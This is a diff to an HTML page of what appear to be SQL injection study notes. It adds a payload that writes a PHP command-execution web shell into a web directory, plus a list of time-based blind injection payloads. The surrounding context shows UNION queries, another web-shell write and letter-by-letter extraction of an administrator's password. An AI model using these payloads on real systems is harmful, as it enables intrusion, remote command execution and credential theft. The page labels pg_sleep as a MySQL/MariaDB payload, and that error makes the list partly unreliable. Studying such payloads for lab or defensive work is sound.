@@ -298,6 +298,9 @@ cn' UNION select 1,COLUMN_NAME,TABLE_NAME,TABLE_SCHEMA from INFORMATION_SCHEMA.C
 cn' UNION SELECT 1,variable_name,variable_value,5 FROM information_schema.global_variables where variable_name="secure_file_priv" --</code></pre>  
                         <p>Writting files using SELECT</p>
                         <pre><code class="language-sql">cn' union select "",'&lt;?php system($_GET["cmd"])?&gt;',"","" into outfile '/var/www/html/shell4.php'#</code></pre>   
+                        <p>If it does not work try to scape the "</p>
+                        <pre><code class="language-sql">' UNION SELECT '&lt;?php echo system(\$_GET[\"cmd\"]); ?&gt;' into outfile '/srv/http/cmd.php' -- -</code></pre>   
+                            
                     </ul>    
                     <h3> Blind SQL injection </h3>
                     <ul>
@@ -305,6 +308,18 @@ cn' UNION SELECT 1,variable_name,variable_value,5 FROM information_schema.global
                     <pre><code class="language-sql">' AND (SELECT 'a' FROM users LIMIT 1)='a</code></pre>
                     We used the following query to check letter by letter the password
                     <pre><code class="language-sql">' AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username='administrator')='a</code></pre>
+                        
+                        <h4>Time-Basd blind injection</h4>
+                        <ul>
+                            <p>Here are some payloads to try</p>
+                             <pre><code class="language-sql">' AND SLEEP(5)-- -   #SQL / MariaDB	
+' AND pg_sleep(5)-- -   #SQL / MariaDB	
+' WAITFOR DELAY '00:00:05'--    #Microsoft SQL Server	
+' AND DBMS_PIPE.RECEIVE_MESSAGE('x',5)=0--     #Oracle	
+' AND SLEEP(5000)--     #H2	</code></pre>>
+                             
+                        </ul>    
+                
                     </ul>
 
                     <h3> SQLi with WebSockets</h3>
